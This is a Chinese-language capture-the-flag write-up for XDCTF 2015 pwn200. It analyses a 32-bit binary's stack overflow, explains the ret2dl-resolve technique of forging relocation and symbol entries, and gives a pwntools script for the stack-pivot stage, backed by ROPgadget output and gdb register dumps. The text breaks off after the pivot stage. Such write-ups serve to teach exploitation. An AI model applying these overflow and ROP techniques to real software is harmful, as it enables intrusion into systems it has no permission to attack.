# XDCTF-2015-PWN-200

首先检查一下文件吧

```c
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

再用IDA Pro查看一下源代码

```c
int __cdecl main()
{
  int buf; // [esp+2Ch] [ebp-6Ch]
  int v2; // [esp+30h] [ebp-68h]
  int v3; // [esp+34h] [ebp-64h]
  int v4; // [esp+38h] [ebp-60h]
  int v5; // [esp+3Ch] [ebp-5Ch]
  int v6; // [esp+40h] [ebp-58h]
  int v7; // [esp+44h] [ebp-54h]

  buf = 1668048215;
  v2 = 543518063;
  v3 = 1478520692;
  v4 = 1179927364;
  v5 = 892416050;
  v6 = 663934;
  memset(&v7, 0, 0x4Cu);
  setbuf(stdout, (char *)&buf);
  write(1, &buf, strlen((const char *)&buf));
  sub_8048484();
  return 0;
}
```

```c
ssize_t sub_8048484()
{
  char buf; // [esp+1Ch] [ebp-6Ch]

  setbuf(stdin, &buf);
  return read(0, &buf, 0x100u);
}
```

显然我们程序有一个很明显的栈溢出漏洞的。这题我们不考虑我们有 **libc** 的情况。我们可以很容易的分析出溢出偏移为 0x6C + 4 = 112

## 思路

- 为了能够实现利用我们要能控制eip指向 .**rel.plt （PLT[0]）**传递index_arg函数也就是对应的偏移，对应函数的**(.plt+6)**位置 push进去的函数的**offset**。通过下面这个指令找到 对应的 **reloc**

- 应该eip已经在**PLT[0]** 的位置所以 栈上我们可以布置好那个我们要利用的**indx_arg**从而 让 定位 **reloc**  时定位到 我们可以控制的 一个地方。

  ```
  const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
  ```

- 接着在可控区域伪造 reloc 的 offset 和 info 从而让 .sym 落在我们可控的区域 

  ```
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  ```

- 伪造的 reloc的 info 最低位 要为 7 ( R_386_JUMP_SLOT=7 ) 

  ```
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
  ```

- 然后我们让这个字符串落在我们可控的地方也就是我们能伪造的地方.**dynsym**->**st_name** 为字符串的偏移。从而让让其定位为我们 需要的函数如 system。 

  ```
  .dynstr + .dynsym->st_name  （.dynsym + Elf32_Sym_size(0x10) * num）
  ```

鉴于 **pwntools** 本身并不支持对重定位表项的信息的获取。这里我们手动看一下

```c
syc@ubuntu:~/Documents/Untitled Folder 3$ readelf -r pwn200

Relocation section '.rel.dyn' at offset 0x300 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff0  00000306 R_386_GLOB_DAT    00000000   __gmon_start__
0804a020  00000805 R_386_COPY        0804a020   stdin@GLIBC_2.0
0804a040  00000605 R_386_COPY        0804a040   stdout@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x318 contains 5 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a000  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0
0804a004  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a008  00000307 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a00c  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a010  00000507 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
```

## 栈迁移

这道题首先 我们要溢出。为了让构造的 ROP 链的长度合适，这里我们可以用到 **栈迁移**

- 首先我们要 将我们想迁移到的地址 覆盖到 程序的 ebp 上这样 执行下一个 汇编指令时 会将 这个值 赋值给 **ebp （pop ebp）**

- 然后我们要在下面调用一次 **leave ret (mov esp, ebp ; pop ebp ;)**这样我们就能将esp 也迁移过去 从而实现栈迁移 

用 ROPgadget 工具找到 我们需要的 汇编指令的地址

```c
syc@ubuntu:~/Documents/Untitled Folder 3$ ROPgadget --binary pwn200 --only 'pop|ret'
Gadgets information
============================================================
0x08048453 : pop ebp ; ret
0x08048452 : pop ebx ; pop ebp ; ret
0x0804856c : pop ebx ; pop edi ; pop ebp ; ret
0x080485cc : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804836c : pop ebx ; ret
0x0804856d : pop edi ; pop ebp ; ret
0x080485cd : pop esi ; pop edi ; pop ebp ; ret
0x0804834b : ret
0x08048532 : ret 0xb8
```

```c
syc@ubuntu:~/Documents/Untitled Folder 3$ ROPgadget --binary pwn200 --only 'leave|ret'
Gadgets information
============================================================
0x08048481 : leave ; ret
0x0804834b : ret
0x08048532 : ret 0xb8
```

找到所需要的 ROP 链的部分,如果我们将payload 写为下面这样运行就能实现 栈迁移,将 ebp 覆盖为我们想要迁移过去的值 ，然后执行 leave_ret 就能将栈迁移过去

```python
from pwn import *
p = process('./pwn200')
elf = ELF('./pwn200')
gdb.attach(p)
offset_ebp = 108
offset_ret = 112
ppp_ret = 0x080485cd 
pop_ebp_ret = 0x08048453 
leave_ret = 0x08048481 
bss_addr = 0x804a020
stack_size = 0x800
base_stage = bss_addr + stack_size 
p.recvuntil('Welcome to XDCTF2015~!\n')
payload = ''
payload+= 'a'*108 
payload+= p32(base_stage) 
payload+= p32(leave_ret)
p.sendline(payload)
p.interactive()
```

EBP已经被我们修改为布置好的**fak_stack**地址

```c
──────────────────────────────────────[ REGISTERS ]───────────────────────────────────────
 EAX  0x75
 EBX  0xfffdad54 ◂— 0x0
 ECX  0xfffdac9c ◂— 0x61616161 ('aaaa')
 EDX  0x100
 EDI  0xfffdad54 ◂— 0x0
 ESI  0xf7ef7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 EBP  0x804a820 ◂— 0x0
 ESP  0xfffdad0c —▸ 0x8048481 ◂— leave  
 EIP  0x80484bd ◂— ret    
────────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x80484bc    leave  
 ► 0x80484bd    ret    <0x8048481>
```

**ret**地址为 **leave ret**的地址将**ebp** 的值交给 **esp** 从而达到栈迁移

```c
──────────────────────────────────────[ REGISTERS ]───────────────────────────────────────
 EAX  0x75
 EBX  0xfffdad54 ◂— 0x0
 ECX  0xfffdac9c ◂— 0x61616161 ('aaaa')
 EDX  0x100
 EDI  0xfffdad54 ◂— 0x0
 ESI  0xf7ef7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 EBP  0x0
 ESP  0x804a824 ◂— 0x0
 EIP  0x8048482 ◂— ret    
────────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x80484bc    leave  
   0x80484bd    ret    
    ↓
   0x8048481    leave  
 ► 0x8048482    ret    <0>
```

